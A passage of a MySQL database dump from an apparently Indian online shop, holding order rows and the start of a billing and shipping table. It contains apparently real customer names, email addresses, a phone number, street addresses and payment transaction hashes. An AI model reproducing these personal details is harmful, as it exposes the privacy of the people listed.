(34, 'GGA00034', 'e064c6e5331c489b96ae', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '299', '0', '', '0', '300', '599', 4, '2022-08-01 11:41:30', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '45.72', '562121', '9645004452399636', 0, '', '', ''),
(35, 'GGA00035', '569a855f0c6632bfe298', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '299', '0', '', '0', '300', '599', 4, '2022-08-01 11:42:57', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '45.72', '562121', '7415368863087877', 0, '', '', ''),
(36, 'GGA00036', '4fc121ae6e2967169d0a', 1, 'syed afroz', 'developerweb50@gmail.com', '2', '218', '0', '', '0', '300', '518', 4, '2022-08-01 11:47:40', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '1347263097470101', 0, '', '', ''),
(37, 'GGA00037', '03d705766d927cd8924a', 1, 'syed afroz', 'developerweb50@gmail.com', '1', '118', '0', '', '0', '300', '418', 4, '2022-08-01 12:03:57', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '4244721033539724', 0, '', '', ''),
(38, 'GGA00038', '75eedb0c798e7921e799', 1, 'syed afroz', 'developerweb50@gmail.com', '1', '40', '0', '', '0', '300', '340', 4, '2022-08-01 12:14:08', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '0', '562121', '6210055802056700', 0, '', '', ''),
(39, 'GGA00039', '964ee107aefd4ce3d5d9', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '168', '0', '', '0', '50', '218', 4, '2022-08-01 12:15:35', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '560064', '1739901663703162', 0, '', '', ''),
(40, 'GGA00040', '09e4186f94e646c71aed', 1, 'syed afroz', 'developerweb50@gmail.com', '1', '118', '0', '', '0', '50', '168', 4, '2022-08-01 12:24:05', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '560064', '5996247330029365', 0, '', '', ''),
(41, 'GGA00041', 'ad286b83baa76972a5f4', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '336', '0', '', '0', '300', '636', 4, '2022-08-01 12:31:49', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '36', '562121', '4643670045186727', 0, '', '', ''),
(42, 'GGA00042', '044728cacc3a2c43f3e5', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '168', '0', '', '0', '300', '468', 4, '2022-08-01 12:35:55', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '6166010551728560', 0, '', '', ''),
(43, 'GGA00043', '35ac05297434df2fb9f6', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '168', '0', '', '0', '300', '468', 4, '2022-08-01 12:36:41', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '2392651219025721', 0, '', '', ''),
(44, 'GGA00044', 'a474b5bf2d10d6891772', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '168', '0', '', '0', '300', '468', 4, '2022-08-01 12:37:29', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '8504148294607237', 0, '', '', ''),
(45, 'GGA00045', '9812633d11b775c555be', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '168', '0', '', '0', '300', '468', 4, '2022-08-01 12:38:02', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '1800592366146106', 0, '', '', ''),
(46, 'GGA00046', 'a50a9ec9a27d9d485d95', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '168', '0', '', '0', '300', '468', 4, '2022-08-01 12:39:25', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '5468469074060589', 0, '', '', ''),
(47, 'GGA00047', '7559f58187f17c0ddfbe', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '168', '0', '', '0', '300', '468', 4, '2022-08-01 12:40:37', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '9903102241443158', 0, '', '', ''),
(48, 'GGA00048', 'e740cc07c3411eacbada', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '168', '0', '', '0', '300', '468', 4, '2022-08-01 12:40:54', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '3527132686042278', 0, '', '', ''),
(49, 'GGA00049', 'e4c3bf51e5ced23179b5', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '168', '0', '', '0', '300', '468', 4, '2022-08-01 12:41:21', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '9840707598708122', 0, '', '', ''),
(50, 'GGA00050', '9c22ed6ddbe747a988a9', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '168', '0', '', '0', '300', '468', 4, '2022-08-01 12:41:36', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '1532422528491157', 0, '', '', ''),
(51, 'GGA00051', 'a23a5fc330569384a33b', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '168', '0', '', '0', '300', '468', 4, '2022-08-01 12:41:53', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '8698826649418225', 0, '', '', ''),
(52, 'GGA00052', '5ad95f8af3f133f137e5', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '168', '0', '', '0', '300', '468', 4, '2022-08-01 12:42:07', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'GGA94759', '2022-08-02 00:00:00', 1, 'assets/pdf/GGA00052.pdf', 1, '18', '562121', '5936594206123435', 0, '', '', ''),
(53, 'GGA00053', '410729eae6ab6db8bc08', 1, 'syed afroz', 'developerweb50@gmail.com', '5', '590', '0', '', '0', '300', '890', 4, '2022-08-01 16:22:46', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '90', '562121', '2462647379304015', 0, '', '', ''),
(54, 'GGA00054', 'cd9eb8ff5bece64adc02', 1, 'syed afroz', 'developerweb50@gmail.com', '2', '236', '0', '', '0', '300', '536', 4, '2022-08-01 16:33:27', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '36', '562121', '2075099005190065', 0, '', '', ''),
(55, 'GGA00055', '1154798f979d510e852f', 1, 'syed afroz', 'developerweb50@gmail.com', '4', '472', '0', '', '0', '300', '772', 4, '2022-08-01 16:43:57', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '72', '562121', '5836320929982084', 0, '', '', ''),
(56, 'GGA00056', '8467a2871f7c92cf071f', 1, 'syed afroz', 'developerweb50@gmail.com', '5', '572', '0', '', '0', '300', '872', 4, '2022-08-01 16:47:57', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '72', '562121', '7584711253459049', 0, '', '', ''),
(57, 'GGA00057', '58022eff44bee921baa3', 1, 'syed afroz', 'developerweb50@gmail.com', '4', '472', '0', '', '0', '300', '772', 4, '2022-08-01 20:03:14', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '72', '562121', '7736612263866240', 0, '', '', ''),
(58, 'GGA00058', '014564536af3fd9c4cef', 1, 'syed afroz', 'developerweb50@gmail.com', '2', '236', '0', '', '0', '300', '536', 4, '2022-08-01 20:11:23', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '36', '562121', '9077188088888387', 0, '', '', ''),
(59, 'GGA00059', '62dc82002f580dc7c38c', 12, 'suresh', 'gvsuresh@savithru.com', '4', '472', '0', '', '0', '50', '522', 4, '2022-08-01 20:16:20', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '72', '560010', '5736256669449783', 0, '', '', ''),
(60, 'GGA00060', '58a6395cc62a775eb13d', 12, 'suresh', 'gvsuresh@savithru.com', '2', '80', '0', '', '0', '50', '130', 4, '2022-08-01 21:40:51', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '0', '560010', '8632154329427837', 0, '', '', ''),
(61, 'GGA00061', 'f5785c68f709e0f6655d', 1, 'syed afroz', 'developerweb50@gmail.com', '2', '236', '0', '', '0', '300', '536', 4, '2022-08-02 10:19:51', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '36', '562121', '3548021599210751', 0, '', '', ''),
(62, 'GGA00062', '26b06bea9e6a3703cca1', 34, 'ran', 'ran@savithru.com', '2', '236', '0', '', '0', '300', '536', 4, '2022-08-02 10:32:16', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '36', '562121', '4347216621619488', 0, '', '', ''),
(63, 'GGA00063', 'b282292241403512b397', 1, 'syed afroz', 'developerweb50@gmail.com', '7', '826', '0', '', '0', '300', '1126', 4, '2022-08-02 10:45:43', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '126', '562121', '9747028794079156', 0, '', '', ''),
(64, 'GGA00064', 'f32c9b6c5889a95fce1d', 1, 'syed afroz', 'developerweb50@gmail.com', '12', '672', '0', '', '0', '300', '972', 4, '2022-08-02 10:47:47', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '72', '562121', '5888581069026634', 0, '', '', ''),
(65, 'GGA00065', '2af4de0e54aadfea4287', 1, 'syed afroz', 'developerweb50@gmail.com', '2', '236', '0', '', '0', '300', '536', 4, '2022-08-02 11:07:59', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '36', '562121', '3485407924140139', 0, '', '', ''),
(66, 'GGA00066', '0cc2a6d99f73fa546b0c', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '276', '0', '', '0', '300', '576', 4, '2022-08-02 11:08:59', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '36', '562121', '8819174861518268', 0, '', '', ''),
(67, 'GGA00067', 'ec67395e584bccee577a', 1, 'syed afroz', 'developerweb50@gmail.com', '1', '118', '0', '', '0', '300', '418', 4, '2022-08-02 11:12:28', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '9782499080044357', 0, '', '', ''),
(68, 'GGA00068', 'da7b402b3e2b3561926c', 1, 'syed afroz', 'developerweb50@gmail.com', '1', '118', '0', '', '0', '300', '418', 4, '2022-08-02 14:10:32', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '18', '562121', '2812450260122009', 0, '', '', ''),
(69, 'GGA00069', '3ed2f1604d1dc408001a', 1, 'syed afroz', 'developerweb50@gmail.com', '6', '545', '0', '', '0', '300', '845', 4, '2022-08-02 15:31:26', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '83.16', '562121', '5751118586343448', 0, '', '', ''),
(70, 'GGA00070', 'f6842de8e355c25a2952', 1, 'syed afroz', 'developerweb50@gmail.com', '2', '259', '0', '', '0', '300', '559', 4, '2022-08-03 12:51:55', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '27.84', '562121', '2145167262885295', 0, '', '', ''),
(71, 'GGA00071', 'dc59c87861dc1efbf6f7', 35, 'Suresh', 'gvsureshiyer@gmail.com', '27', '3028', '0', '', '0', '50', '3078', 4, '2022-08-03 15:26:51', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '116.76', '560010', '3114621935278658', 0, '', '', ''),
(72, 'GGA00072', '58baaff71b6650622b3f', 35, 'Suresh', 'gvsureshiyer@gmail.com', '1', '147', '0', '', '0', '50', '197', 4, '2022-08-03 15:38:22', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '15.84', '560079', '4135653175660682', 0, '', '', ''),
(73, 'GGA00073', '9f7cbfcc35060fa071bb', 1, 'syed afroz', 'developerweb50@gmail.com', '5', '541', '0', '', '0', '300', '841', 4, '2022-08-04 09:02:06', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '6.36', '562121', '5731984620573091', 0, '', '', ''),
(74, 'GGA00074', '87d8547589a9178bfbc8', 1, 'syed afroz', 'developerweb50@gmail.com', '3', '334', '0', '', '0', '300', '634.08', 4, '2022-08-04 09:38:44', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '19.08', '562121', '5502275738908638', 0, '', '', ''),
(75, 'GGA00075', '7098922385802adf2ebe', 1, 'syed afroz', 'developerweb50@gmail.com', '1', '106', '0', '', '0', '300', '406', 4, '2022-08-04 09:50:57', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '0', '562121', '8719071169117008', 0, '', '', ''),
(76, 'GGA00076', '413a568afdc7aef7851a', 1, 'syed afroz', 'developerweb50@gmail.com', '1', '156', '0', '', '0', '300', '456', 4, '2022-08-04 10:19:59', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '0', '562121', '4236382468592120', 0, '', '', ''),
(77, 'GGA00077', 'c2bd23deac24da12dc5f', 1, 'syed afroz', 'developerweb50@gmail.com', '1', '156', '0', '', '0', '300', '456', 4, '2022-08-04 10:23:48', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '0', '562121', '1382746093803914', 0, '', '', ''),
(78, 'GGA00078', '6d75010efbe3a0f7cd3d', 5, 'AshwinH', 'ashwin@savithru.com', '1', '116.0', '', '0.00', '', '50', '179.92', 4, '2022-08-04 10:37:26', '2022-08-08', 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '13.92', '560010', '91366510', 0, '', '', ''),
(79, 'GGA00079', 'dd7eeddc2b7b7a0e2062', 5, 'AshwinH', 'ashwin@savithru.com', '1', '116.0', '', '0.00', '', '50', '179.92', 4, '2022-08-04 10:37:48', '2022-08-08', 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '13.92', '560010', '92767165', 0, '', '', ''),
(80, 'GGA00080', '07779740d280b8d37fcf', 5, 'AshwinH', 'ashwin@savithru.com', '1', '116.0', '', '0.00', '', '50', '179.92', 4, '2022-08-04 10:39:35', '2022-08-08', 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '13.92', '560010', '48717096', 0, '', '', ''),
(81, 'GGA00081', 'e87633c4dfe55a471e49', 5, 'AshwinH', 'ashwin@savithru.com', '2', '212.0', '', '0.00', '', '50', '274.72', 4, '2022-08-04 10:45:31', '2022-08-08', 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '12.72', '560010', '93462896', 0, '', '', ''),
(82, 'GGA00082', 'd1466b40e31ca471818d', 5, 'AshwinH', 'ashwin@savithru.com', '2', '212.0', '', '0.00', '', '50', '274.72', 4, '2022-08-04 12:21:11', '2022-08-08', 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '12.72', '560010', '74899665', 0, '', '', ''),
(83, 'GGA00083', 'b6ad58a4bb52f0470ccd', 5, 'Ashwin', 'ashwin@savithru.com', '1', '129', '0', '', '0', '50', '179.92', 4, '2022-08-04 12:36:59', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '13.92', '560010', '7523217149483048', 0, '', '', ''),
(124, 'GGA00124', '4ebdd822f474744d3760', 33, 'shri', 'shri@gmail.com', '1', '85', '0', '', '0', '50', '135', 4, '2022-10-20 18:28:12', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '0', '560013', '6889780758402087', 0, '', '', ''),
(121, 'GGA00121', '2d024b47e2bc5a07f514', 20, 'shilpa', 'shilpa@savithru.com', '1', '106', '0', '', '0', '100', '206', 4, '2022-09-16 16:08:48', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'GGA43742', '2022-09-16 00:00:00', 1, 'assets/pdf/GGA00121.pdf', 1, '0', '560022', '7506201702438654', 0, '', '', ''),
(122, 'GGA00122', '8ebc56f2bba13eddbec5', 33, 'shri', 'shri@gmail.com', '1', '85', '0', '', '0', '50', '135', 4, '2022-10-17 17:18:29', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '0', '560013', '6862080156289210', 0, '', '', ''),
(123, 'GGA00123', '8c1d49a821ec3e74ef40', 33, 'shri', 'shri@gmail.com', '1', '85', '0', '', '0', '50', '135', 4, '2022-10-17 17:28:46', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '0', '560013', '8797132943156141', 0, '', '', ''),
(111, 'GGA00111', '47ed2eb2d6c83a093e5e', 5, 'AshwinH', 'ashwin@savithru.com', '2', '212.0', '', '0.00', '', '50', '262.00', 4, '2022-08-09 15:09:13', '2022-08-13', 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '0.00', '560010', '19279976', 0, '', '', ''),
(144, 'GGA00144', '990290a33e4bf92f07e0', 5, 'Ashwintext', 'ashwin@savithru.com', '1', '127.0', '', '0.00', '', '50', '1.00', 4, '2022-10-26 17:43:43', '2022-10-30', 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '0.00', '560010', '84545626', 0, '', '', ''),
(145, 'GGA00145', 'b8c453c98624f334e02c', 5, 'Ashwintext', 'ashwin@savithru.com', '1', '127.0', '', '0.00', '', '50', '1.00', 4, '2022-10-26 17:47:33', '2022-10-30', 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '0.00', '560010', '90334976', 0, '', '', ''),
(146, 'GGA00146', '769efeabcbb358a6ccdc', 5, 'Ashwintext', 'ashwin@savithru.com', '1', '127.0', '', '0.00', '', '50', '1.00', 4, '2022-10-26 17:51:15', '2022-10-30', 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '0.00', '560010', '49939083', 0, 'E2210262LG6BPD', 'af9c0e0c1dee63e5acad8b7ed1a5be96', '516dcc037c4c2911345d5f9d6c3a53b0851c16f9ab54244bf4cd847d721eb582843d27ae45d93740fa16538344be191b0511fb81d32ac2ac7561debb1a80f37a'),
(147, 'GGA00147', '37e5c6d9f6eb6f99a9ed', 12, 'suresh', 'gvsuresh@savithru.com', '1', '212', '0', '', '0', '50', '262', 4, '2022-10-27 10:35:05', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'GGA60985', '2023-03-24 00:00:00', 1, 'assets/pdf/GGA00147.pdf', 1, '0', '560010', '4432678697103690', 0, '', '', ''),
(148, 'GGA00148', 'a3f51d5f71fb073c8a14', 12, 'suresh', 'gvsuresh@savithru.com', '2', '278', '0', '', '0', '50', '328', 4, '2022-10-27 10:38:27', NULL, 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '0', '560010', '3562058362684692', 0, '', '', ''),
(149, 'GGA00149', 'ad25e157e50f139cb628', 12, 'suresh', 'gvsuresh@savithru.com', '1', '77', '0', '', '0', '50', '127', 4, '2022-10-27 10:40:41', NULL, 1, 0, NULL, 'Online', 'success', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '0', '560010', '5931716301492144', 0, '', '', ''),
(150, 'GGA00150', 'be67dfcc78697ef4ff7e', 5, 'Ashwintext', 'ashwin@savithru.com', '1', '127.0', '', '0.00', '', '50', '177.00', 4, '2022-11-04 11:09:39', '2022-11-08', 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '0.00', '560010', '95245835', 0, '', '', ''),
(151, 'GGA00151', '8140f1d173c9b2a954ff', 5, 'Ashwintext', 'ashwin@savithru.com', '2', '162.0', '', '0.00', '', '50', '212.00', 4, '2022-11-04 11:10:26', '2022-11-08', -1, 0, NULL, 'Online', 'cancelled', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '0.00', '560010', '27709536', 0, 'E221104EB3EC91', '9d38e6eab92b2aeb0a83b570188d5a1a', 'dadef248bfed08e4971e45434ee6c75919623d9321f4a263dcd49c5d532eadcc93397e10513c4d1bcbad5b2d58f828cfe3f09159c24a60d800e41e56b84a545e'),
(152, 'GGA00152', 'd90405da4c89db823133', 17, 'SavithruTechnologies', 'uday@savithru.com', '1', '77', '', '', '', '50', '127', 4, '2022-11-04 16:12:13', '2022-11-08', 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '', '560079', '39395481', 0, '', '', ''),
(153, 'GGA00153', '01c26d4dedb017b291b3', 17, 'SavithruTechnologies', 'uday@savithru.com', '1', '77', '', '', '', '50', '127', 4, '2022-11-04 17:12:55', '2022-11-08', 2, 0, NULL, 'Online', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 0, '', '560079', '61377039', 0, '', '', ''),
(154, 'GGA00154', 'b80b74e33846bb07c6e8', 33, 'shri', 'shri@gmail.com', '1', '67', '0', '', '0', '50', '117.2', 4, '2022-11-16 11:29:30', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '3.2', '560013', '4048801453230527', 0, '', '', ''),
(155, 'GGA00155', '7edf22ec421c38baf52a', 39, 'harsha', 'harsha@savithru.com', '1', '67', '0', '', '0', '50', '117.2', 4, '2022-12-06 10:17:08', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '3.2', '560010', '6092751252583398', 0, '', '', ''),
(156, 'GGA00156', '6443581f306c2d2e3416', 40, 'Sonu', 'digital.acadamis@gmail.com', '1', '67', '0', '', '0', '50', '117.2', 4, '2023-02-11 10:20:44', NULL, 1, 0, NULL, 'cod', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00 00:00:00', 0, '', 1, '3.2', '560072', '6574706858505166', 0, '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `orders_bill_ship`
--

CREATE TABLE `orders_bill_ship` (
  `oid` int(11) NOT NULL,
  `bname` text NOT NULL,
  `bemail` text NOT NULL,
  `baddr1` text NOT NULL,
  `baddr2` text NOT NULL,
  `bcity` text NOT NULL,
  `bcity_id` int(11) NOT NULL,
  `bstate` text NOT NULL,
  `bcountry` varchar(100) NOT NULL,
  `bpincode` varchar(100) NOT NULL,
  `bphone` varchar(100) NOT NULL,
  `sname` text NOT NULL,
  `saddr1` text NOT NULL,
  `saddr2` text NOT NULL,
  `scity` text NOT NULL,
  `scity_id` int(11) NOT NULL,
  `sstate` text NOT NULL,
  `scountry` varchar(100) NOT NULL,
  `spincode` varchar(100) NOT NULL,
  `sphone` varchar(100) NOT NULL,
  `landmark` text NOT NULL,
  `randid` varchar(50) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `orders_bill_ship`
--

INSERT INTO `orders_bill_ship` (`oid`, `bname`, `bemail`, `baddr1`, `baddr2`, `bcity`, `bcity_id`, `bstate`, `bcountry`, `bpincode`, `bphone`, `sname`, `saddr1`, `saddr2`, `scity`, `scity_id`, `sstate`, `scountry`, `spincode`, `sphone`, `landmark`, `randid`) VALUES
(1, 'syed afroz', 'developerweb50@gmail.com', 'Yelhanka', 'Bengalurus', '2', 2, '', 'India', '562158', '9986571787', 'syed afroz', 'Yelhanka', 'Bengalurus', '', 2, '2', 'India', '562158', '9986571787', '', '5782563857038247'),
(2, 'syed afroz', 'developerweb50@gmail.com', 'Yelhanka', 'Bengalurus', '2', 2, '', 'India', '562158', '9986571787', 'syed afroz', 'Yelhanka', 'Bengalurus', '', 2, '2', 'India', '562158', '9986571787', '', '5062744128451791'),
